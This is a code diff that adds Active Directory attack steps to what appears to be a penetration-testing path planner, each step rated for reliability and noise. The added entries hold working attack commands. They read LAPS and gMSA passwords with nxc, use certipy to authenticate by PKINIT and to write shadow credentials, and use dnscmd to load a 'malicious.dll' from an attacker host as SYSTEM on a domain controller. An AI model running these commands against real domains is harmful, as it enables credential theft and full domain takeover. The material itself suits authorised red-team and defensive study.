@@ -71,6 +71,11 @@ class Capability(enum.Enum):
     SCCM_MANAGEMENT_POINT = "sccm_management_point"  # discovered SCCM MP / site
     SCCM_NAA_CREDS = "sccm_naa_creds"            # recovered SCCM Network Access Account creds
     NETWORK_FOOTHOLD = "network_foothold"        # creds/shell from a non-AD service (switch, SNMP, FTP/NFS, EternalBlue)
+    HOST_LIST = "host_list"                      # enumerated DNS/host inventory (zone transfer)
+    DNSADMINS_MEMBER = "dnsadmins_member"        # member of DnsAdmins (DLL load on DC's DNS service)
+    LAPS_READABLE = "laps_readable"              # can read LAPS password on some host
+    GMSA_READABLE = "gmsa_readable"              # can read a gMSA's managed password
+    SHADOW_CRED_WRITABLE = "shadow_cred_writable"  # can write msDS-KeyCredentialLink on a principal
 
     # --- goals -----------------------------------------------------------
     DCSYNC = "dcsync"                            # can replicate secrets (near-DA)
@@ -395,6 +400,88 @@ def baseline_steps() -> list[PathStep]:
             ),
             reliability=Reliability.SPECULATIVE,
             noise=Noise.MODERATE,
+            source="baseline",
+        ),
+        PathStep(
+            name="Read LAPS password -> local admin credentials",
+            technique="LAPS-read",
+            requires=frozenset({Capability.LAPS_READABLE}),
+            grants=Capability.VALID_CREDENTIALS,
+            command="nxc ldap DC -u USER -p PASS -M laps  # read ms-Mcs-AdmPwd(V2)",
+            description=(
+                "Read the local administrator password LAPS manages for a "
+                "host, a usable local-admin credential on that host."
+            ),
+            reliability=Reliability.HIGH,
+            noise=Noise.QUIET,
+            source="baseline",
+        ),
+        PathStep(
+            name="Read gMSA managed password -> credentials",
+            technique="gMSA-read",
+            requires=frozenset({Capability.GMSA_READABLE}),
+            grants=Capability.VALID_CREDENTIALS,
+            command=(
+                "nxc ldap DC -u USER -p PASS --gmsa  "
+                "# decode msDS-ManagedPassword to an NTLM hash"
+            ),
+            description=(
+                "Decode a readable gMSA managed password blob to the "
+                "account's current NTLM hash, usable like any other credential."
+            ),
+            reliability=Reliability.HIGH,
+            noise=Noise.QUIET,
+            source="baseline",
+        ),
+        PathStep(
+            name="DnsAdmins membership -> SYSTEM on DC",
+            technique="DnsAdmins-abuse",
+            requires=frozenset({Capability.DNSADMINS_MEMBER}),
+            grants=Capability.LOCAL_ADMIN,
+            command=(
+                "dnscmd DC-NAME /config /serverlevelplugindll "
+                "\\\\ATTACKER-HOST\\share\\malicious.dll  # then restart DNS "
+                "service (or wait) to load it as SYSTEM"
+            ),
+            description=(
+                "A DnsAdmins member can configure the DNS server to load an "
+                "arbitrary DLL, which runs as SYSTEM - typically on the DC "
+                "itself where the DNS service runs."
+            ),
+            reliability=Reliability.HIGH,
+            noise=Noise.LOUD,
+            source="baseline",
+        ),
+        PathStep(
+            name="Authenticate with a user certificate -> credentials",
+            technique="PKINIT-auth",
+            requires=frozenset({Capability.CERT_AS_USER}),
+            grants=Capability.VALID_CREDENTIALS,
+            command="certipy auth -pfx target.pfx -dc-ip DC-IP",
+            description=(
+                "Authenticate via PKINIT with a certificate issued for an "
+                "arbitrary (non-DA) principal to recover that user's NT hash "
+                "- a working credential, usable like any other."
+            ),
+            reliability=Reliability.HIGH,
+            noise=Noise.QUIET,
+            source="baseline",
+        ),
+        PathStep(
+            name="Write Shadow Credentials -> authenticate as the principal",
+            technique="Shadow-Credentials",
+            requires=frozenset({Capability.SHADOW_CRED_WRITABLE}),
+            grants=Capability.CERT_AS_USER,
+            command=(
+                "certipy shadow auto -u USER -p PASS -account TARGET "
+                "-dc-ip DC-IP  # add a key credential, then PKINIT as TARGET"
+            ),
+            description=(
+                "Add a shadow credential (msDS-KeyCredentialLink) to the "
+                "target principal, then authenticate via PKINIT as them."
+            ),
+            reliability=Reliability.HIGH,
+            noise=Noise.QUIET,
             source="baseline",
         ),
         PathStep(
